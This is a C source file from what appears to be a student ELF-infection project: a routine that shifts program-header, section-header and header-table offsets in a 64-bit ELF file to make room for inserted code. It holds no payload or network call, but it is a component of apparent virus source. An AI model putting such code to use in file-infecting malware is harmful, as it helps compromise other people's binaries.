/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   adjust_references.c                                :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/05/13 14:56:28 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/06 04:42:39 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infect.h"

struct		data
{
	size_t	shift_amount;
	size_t	end_last_sect;
};

static bool	shift_phdr_position(struct safe_pointer info, \
			const struct endians_pointer endians, \
			const size_t offset, void *data)
{
	struct data	*closure = data;
	Elf64_Phdr	*phdr    = safe(offset, sizeof(Elf64_Phdr));
	if (phdr == NULL) return errors(ERR_CORRUPT, "bad phdr offset");

	Elf64_Off	p_offset = endians.endian_8(phdr->p_offset);

	if (p_offset > closure->end_last_sect)
	{
		p_offset      += closure->shift_amount;
		phdr->p_offset = endians.endian_8(p_offset);
	}
	return true;
}

static bool	shift_shdr_position(struct safe_pointer info, \
			const struct endians_pointer endians, \
			const size_t offset, void *data)
{
	struct data 	*closure = data;
	Elf64_Shdr	*shdr    = safe(offset, sizeof(Elf64_Shdr));
	if (shdr == NULL) return errors(ERR_CORRUPT, "bad shdr offset");

	Elf64_Off	sh_offset = endians.endian_8(shdr->sh_offset);

	if (sh_offset > closure->end_last_sect)
	{
		sh_offset      += closure->shift_amount;
		shdr->sh_offset = endians.endian_8(sh_offset);
	}
	return true;
}

static void	adjust_phdr_table_offset(const struct endians_pointer endians, \
			Elf64_Ehdr *safe_elf_hdr, \
			size_t shift_amount, size_t end_last_sect)
{
	Elf64_Off	e_phoff = endians.endian_8(safe_elf_hdr->e_phoff);

	if (e_phoff < end_last_sect)
		return;

	e_phoff              += shift_amount;
	safe_elf_hdr->e_phoff = endians.endian_8(e_phoff);
}

static void	adjust_shdr_table_offset(const struct endians_pointer endians, \
			Elf64_Ehdr *safe_elf_hdr, \
			size_t shift_amount, size_t end_last_sect)
{
	Elf64_Off	e_shoff = endians.endian_8(safe_elf_hdr->e_shoff);

	if (e_shoff < end_last_sect)
		return;

	e_shoff              += shift_amount;
	safe_elf_hdr->e_shoff = endians.endian_8(e_shoff);
}

bool		adjust_references(const struct safe_pointer info, \
			const struct endians_pointer endians, \
			size_t shift_amount, const struct entry *original_entry)
{
	struct data	closure;

	if (shift_amount == 0)
		return true;

	closure.shift_amount  = shift_amount;
	closure.end_last_sect = original_entry->end_of_last_section;

	Elf64_Ehdr	*elf_hdr = safe(0, sizeof(Elf64_Ehdr));
	if (elf_hdr == NULL) return errors(ERR_CORRUPT, "wildly unreasonable");

	adjust_phdr_table_offset(endians, elf_hdr, shift_amount, closure.end_last_sect);
	adjust_shdr_table_offset(endians, elf_hdr, shift_amount, closure.end_last_sect);

	if (!foreach_phdr(info, endians, shift_phdr_position, &closure))
		return errors(ERR_THROW, "adjust_references");
	if (!foreach_shdr(info, endians, shift_shdr_position, &closure))
		return errors(ERR_THROW, "adjust_references");

	return true;
}
